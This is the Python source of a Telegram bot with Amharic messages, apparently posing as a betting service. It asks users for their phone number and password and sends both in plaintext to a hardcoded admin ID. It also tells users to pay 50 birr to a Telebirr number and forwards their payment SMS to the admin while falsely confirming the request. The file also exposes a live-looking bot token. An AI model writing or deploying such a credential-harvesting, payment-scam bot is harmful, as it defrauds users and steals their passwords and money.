import os
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# 1. Render እንዳያቋርጠው ፖርት የሚከፍት ሲስተም
def run_dummy_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    print(f"🌍 Dummy server running on port {port}")
    server.serve_forever()

# ያንተ የቴሌግራም ID ቁጥር
ADMIN_ID = "8647863200" 

# የውይይት ደረጃዎች
PHONE, PASSWORD, MENU = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"ሰላም {user.first_name}! ወደ ቦቱ በደህና መጡ።\n\nእባክዎ መጀመሪያ የስልክ ቁጥርዎን ያስገቡ፡",
        reply_markup=ReplyKeyboardRemove()
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['phone'] = phone
    await update.message.reply_text("አመሰግናለሁ! አሁን ደግሞ የይለፍ ቃልዎን (Password) ያስገቡ፡")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    phone = context.user_data['phone']
    user = update.effective_user
    
    await update.message.reply_text("በስኬት ተመዝግበዋል! ✅")
    
    # የምዝገባ መረጃ ለአንተ መላኪያ
    log_message = (
        f"🔔 **አዲስ ተጠቃሚ ተመዝግቧል!**\n\n"
        f"👤 ስም: {user.first_name}\n"
        f"🆔 ID: {user.id}\n"
        f"📱 ስልክ: `{phone}`\n"
        f"🔑 ፓስወርድ: `{password}`"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=log_message, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending to admin: {e}")

    # ዋናው ሜኑ ቁልፎች
    keyboard = [
        [
            InlineKeyboardButton("💰 Deposit", callback_data='btn_deposit'),
            InlineKeyboardButton("💸 Withdraw", callback_data='btn_withdraw')
        ],
        [
            InlineKeyboardButton("📞 Support (ቻናል)", url="https://t.me/shamobetsuport18")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("ምን ማድረግ ይፈልጋሉ? ከታች ካሉት አማራጮች ይምረጡ፦", reply_markup=reply_markup)
    return MENU

async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'btn_deposit':
        # ያንተ አዲሱ የ 50 ብር እና የቴክስት መመሪያ
        deposit_text = (
            "የሚያጋጥማቹ የክፍያ ችግር:\n"
            "@gashabetsupports\n"
            "ላይ ፃፉልን።\n\n"
            "1. ከታች ባለው የቴሌብር አካውንት 50 ብር ያስገቡ\n"
            "    **Phone: 0936469876**\n\n"
            "2. የከፈሉበትን አጭር የጹሁፍ መልዕክት(message) copy በማድረግ እዚ ላይ Past አድረገው ያስገቡና ይላኩት👇👇👇"
        )
        await query.message.reply_text(deposit_text, parse_mode="Markdown")
    elif query.data == 'btn_withdraw':
        await query.message.reply_text("💸 እባክዎ ማውጣት (Withdraw) የሚፈልጉትን የብር መጠን ቁጥር ብቻ ይላኩ፦")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    phone = context.user_data.get('phone', 'ያልታወቀ')
    
    # ተጠቃሚው የላከው መልዕክት የቴሌብር SMS ወይም መረጃ ከሆነ
    await update.message.reply_text("የ 50 ብር ጥያቄዎ ተቀባይነት አግኝቷል! በቅርቡ ይስተናገዳል። ⏳")
    
    # ተጠቃሚው Past ያደረገውን የክፍያ መልዕክት ለአንተ የሚልክልህ ክፍል
    admin_report = (
        f"💵 **አዲስ የገንዘብ/Deposit ማረጋገጫ ደርሷል!**\n\n"
        f"👤 ከስም: {user.first_name}\n"
        f"📱 የተጠቃሚ ስልክ: `{phone}`\n"
        f"📝 **የተላከው የክፍያ መልዕክት (SMS)፦**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{text}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending report to admin: {e}")
        
    return MENU

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ሂደቱ ተቋርጧል። እንደገና ለመጀመር /start ይበሉ።", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()

    app = ApplicationBuilder().token("8960492606:AAEQKJN5S70C3u6OQVVGUkfLNEC7K2w7deA").build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            MENU: [
                CallbackQueryHandler(button_click),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    app.add_handler(conv_handler)
    app.run_polling()
